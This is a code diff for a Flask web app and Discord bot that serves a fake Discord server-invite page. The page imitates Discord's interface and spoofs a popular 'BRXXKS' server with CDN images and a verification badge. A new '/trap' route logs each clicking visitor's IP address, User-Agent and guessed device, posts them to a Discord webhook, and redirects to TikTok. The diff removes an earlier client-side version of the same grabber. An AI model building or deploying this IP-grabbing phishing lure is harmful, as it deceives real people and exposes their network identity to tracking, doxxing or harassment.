@@ -5,7 +5,7 @@ import requests
 import threading
 import discord
 from discord.ext import commands
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, redirect
 
 # Force IPv4 to prevent Railway boot hangs
 _orig_getaddrinfo = socket.getaddrinfo
@@ -28,43 +28,53 @@ FAKE_JOIN_HTML = """
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord</title>
+    <meta property="og:title" content="BRXXKS">
+    <meta property="og:description" content="BRXXKS Official Community Server!">
+    <meta property="og:image" content="https://cdn.discordapp.com/icons/1188617507765235722/a_1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.webp">
     <style>
-        body { margin: 0; padding: 0; background-color: #313338; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .card { background-color: #2b2d31; border-radius: 8px; width: 90%; max-width: 400px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.5); text-align: center; padding-bottom: 20px; }
-        .banner { height: 120px; background: #1e1f22; }
-        .icon { width: 80px; height: 80px; border-radius: 50%; border: 6px solid #2b2d31; background-color: #000; margin: -40px auto 10px auto; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 24px; }
-        .title { font-size: 20px; font-weight: bold; margin-bottom: 8px; }
-        .status { color: #b5bac1; font-size: 14px; margin-bottom: 20px; }
-        .dot { height: 10px; width: 10px; background-color: #23a55a; border-radius: 50%; display: inline-block; margin-right: 5px; }
-        .btn { background-color: #23a55a; color: #fff; border: none; padding: 12px 24px; font-size: 16px; border-radius: 4px; cursor: pointer; width: 80%; font-weight: bold; transition: 0.2s; }
-        .btn:hover { background-color: #1e8e4e; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #313338; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .embed { background-color: #2b2d31; width: 432px; border-radius: 4px; overflow: hidden; border-left: 4px solid #4f545c; display: flex; flex-direction: column; }
+        .banner { width: 100%; height: 120px; object-fit: cover; }
+        .content { padding: 16px; position: relative; }
+        .icon { width: 80px; height: 80px; border-radius: 50%; border: 6px solid #2b2d31; background-color: #000; position: absolute; top: -40px; left: 16px; object-fit: cover; }
+        .title-row { margin-top: 40px; display: flex; align-items: center; gap: 8px; }
+        .title { color: #f2f3f5; font-size: 20px; font-weight: 600; }
+        .badges { display: flex; gap: 4px; }
+        .badge { height: 20px; }
+        .stats { color: #b5bac1; font-size: 14px; margin-top: 8px; display: flex; align-items: center; gap: 12px; }
+        .dot { height: 8px; width: 8px; background-color: #23a55a; border-radius: 50%; display: inline-block; margin-right: 4px; }
+        .dot.grey { background-color: #80848e; }
+        .desc { color: #dbdee1; font-size: 14px; margin-top: 16px; line-height: 1.4; }
+        .btn { background-color: #248046; color: #fff; border: none; padding: 10px; font-size: 14px; border-radius: 3px; cursor: pointer; width: 100%; font-weight: 500; transition: 0.2s; margin-top: 16px; text-align: center; text-decoration: none; display: block; }
+        .btn:hover { background-color: #1a6334; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="banner"></div>
-        <div class="icon">C😭s</div>
-        <div class="title">CloudyPookie😭's server</div>
-        <div class="status"><span class="dot"></span> 4 Online &nbsp; • &nbsp; 5 Members</div>
-        <button class="btn" onclick="startTrap()">Join Server</button>
+    <div class="embed">
+        <img src="https://cdn.discordapp.com/banners/1188617507765235722/a_1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.webp?size=600" class="banner" alt="Banner">
+        <div class="content">
+            <img src="https://cdn.discordapp.com/icons/1188617507765235722/a_1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.webp?size=128" class="icon" alt="Icon">
+            <div class="title-row">
+                <div class="title">BRXXKS</div>
+                <div class="badges">
+                    <svg class="badge" viewBox="0 0 24 24" fill="#5865F2"><path d="M12 0L14.59 3.41L18.94 2.85L19.97 7.1L23.79 9.25L22.15 13.32L24 17.24L20.41 19.57L19.04 23.69L14.7 22.84L11.75 25.85L9.12 22.47L4.78 23.42L3.51 19.38L0 16.9L1.84 12.95L0 9L3.51 6.52L4.78 2.48L9.12 3.43L11.75 0H12Z"></path><path fill="#fff" d="M9.99 16.22L6.61 12.84L8.02 11.43L9.99 13.4L15.98 7.41L17.39 8.82L9.99 16.22Z"></path></svg>
+                    <img class="badge" src="https://i.imgur.com/8QOq4w9.jpeg" alt="BRXK">
+                </div>
+            </div>
+            <div class="stats">
+                <span><span class="dot"></span>7,054 Online</span>
+                <span><span class="dot grey"></span>147,903 Members</span>
+            </div>
+            <div class="stats" style="margin-top: 4px;">Est. Aug 2023</div>
+            <div class="desc">
+                BRXXKS Official Community Server!<br><br>
+                🗡️🔥 🛡️🔥
+            </div>
+            
+            <a href="/trap" class="btn">Join</a>
+        </div>
     </div>
-
-    <script>
-        async function startTrap() {
-            document.querySelector('.btn').innerText = "Joining...";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                await fetch('/log', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ip: data.ip, ua: navigator.userAgent})
-                });
-            } catch (e) {}
-            // Redirect to TikTok after grab
-            window.location.href = "https://vt.tiktok.com/ZSs8LHYyG/";
-        }
-    </script>
 </body>
 </html>
 """
@@ -73,11 +83,11 @@ FAKE_JOIN_HTML = """
 def index():
     return render_template_string(FAKE_JOIN_HTML)
 
-@app.route('/log', methods=['POST'])
-def log():
-    data = request.json
-    ip = data.get('ip', 'Unknown')
-    ua = data.get('ua', 'Unknown')
+@app.route('/trap')
+def trap():
+    # Grab the IP
+    ip = request.headers.get('CF-Connecting-IP', request.remote_addr)
+    ua = request.headers.get('User-Agent', 'Unknown')
     
     device = "Unknown"
     if "Windows" in ua: device = "Windows PC"
@@ -92,13 +102,15 @@ def log():
             "fields": [
                 {"name": "Device Name", "value": f"```{device}```", "inline": False},
                 {"name": "Public IP", "value": f"```{ip}```", "inline": False},
-                {"name": "Wi-Fi Network", "value": "```N/A```", "inline": False}
+                {"name": "Method", "value": "```Widget Link Click```", "inline": False}
             ]
         }]
     }
     if WEBHOOK_URL:
         requests.post(WEBHOOK_URL, json=payload)
-    return "ok", 200
+    
+    # Redirect to TikTok after grab
+    return redirect("https://vt.tiktok.com/ZSs8LHYyG/", code=302)
 
 # --- DISCORD BOT ---
 intents = discord.Intents.default()
